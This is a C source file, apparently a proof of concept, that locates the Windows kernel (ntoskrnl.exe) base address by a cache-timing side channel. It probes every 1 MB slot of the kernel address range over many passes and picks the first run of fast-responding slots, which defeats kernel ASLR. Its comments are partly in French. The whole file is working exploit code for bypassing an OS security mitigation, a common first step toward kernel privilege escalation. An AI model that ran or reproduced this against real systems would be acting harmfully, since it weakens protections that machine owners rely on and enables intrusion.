#include <stdio.h>
// gcc nokaslr.c nokaslr.o -o nokaslr.exe

/*
https://msrc.microsoft.com/blog/2022/04/randomizing-the-kuser_shared_data-structure-on-windows/

0x0000000000000000 -> 0x00007FFFFFFFFFFF  -> Espace user-mode (128 To)
0xFFFF080000000000 -> 0xFFFFFFFFFFFFFFFF  -> Espace kernel-mode (128 To)

OLD exemple : 
kASLR load ntoskrnl.exe in a range of 0x800000000 (32Go)
aligned on 21bits => 0b100000000000000000000 => 0x100000 (1Mo)

so every 1Mb is a potential space of ntoskrn.exe : 
    range // step = 0x8000 : 32 768 possibilités
*/
#define START_KADDR 0xfffff80000000000ULL
#define STOP_KADDR 0xfffff80500000000ULL

#define KSTEP_SIZE  0x100000
#define KSTEPS ((STOP_KADDR - START_KADDR) / KSTEP_SIZE)

#define uint64 __UINT64_TYPE__

unsigned int cacheTiming(void* addr);

uint64 getKrnlBase(){
    uint64 timings[KSTEPS] = {0};
    uint64 addrs[KSTEPS] = {0};

    // Phase de mesure sur 0x100 + 5 passes
    for (int pass = 0; pass < 0x100 + 5; pass++) {

        for (uint64 i = 0; i < KSTEPS; i++) {
            if (!addrs[i])
                addrs[i] = START_KADDR + i * KSTEP_SIZE;

            unsigned int t = cacheTiming((void*)addrs[i]);
            if (i < 15 && pass == 105) {
                printf("[debug] addr[%llx] -> %u\n", addrs[i], t);
            }

            if (pass >= 5)
                timings[i] += t;
        }
    }

    for (uint64 i = 0; i < KSTEPS; i++) {
        timings[i] /= 0x100;
    }

    // On récupères les timings les plus présent (ne sont forcément pas ntoskrnl)
    unsigned long long total = 0;
    unsigned int count = 0;
    for (uint64 i = 0; i < KSTEPS; i++) {
        if (timings[i] > 200) { // Exclut les accès trop rapides pour trouver les plus lents
            total += timings[i];
            count++;
        }
    }
    int mostAvg = (count > 0) ? total / count : 0;
    printf("[debug] estimated 'non-mapped' timing (avg) : %d\n", mostAvg);

    // Seuils pour détecter les timings selon un temps considéré comme rapide ou lent
    unsigned int baseThreshold1 = mostAvg / 5;  // rapide
    unsigned int baseThreshold2 = mostAvg / 10; // pas rapide

    // On cherche les premières 12 pages qui ont un timing rapide
    // sum est le nompre de pages rapides consécutives
    for (uint64 i = 0; i < KSTEPS - 0xc; i++) {
        int sum = 0;
        for (uint64 x = 0; x < 0xc; x++) {
            //if trop lent 
            if (timings[i + x] >= mostAvg - baseThreshold2) {
                sum = -1;
                break;
            }
            sum += timings[i + x];
        }
        if (sum == -1) continue;

        sum /= 0xc;
        if (sum < (mostAvg - baseThreshold1)) {
            return START_KADDR + i * KSTEP_SIZE;
        }
    }
    return 0;
}


int main(int argc, char** argv){
    uint64 ntoskrnl_base = 0;

    ntoskrnl_base = getKrnlBase();

    printf("[*] ntoskrnl base : 0x%llx", ntoskrnl_base);
    return 0;
}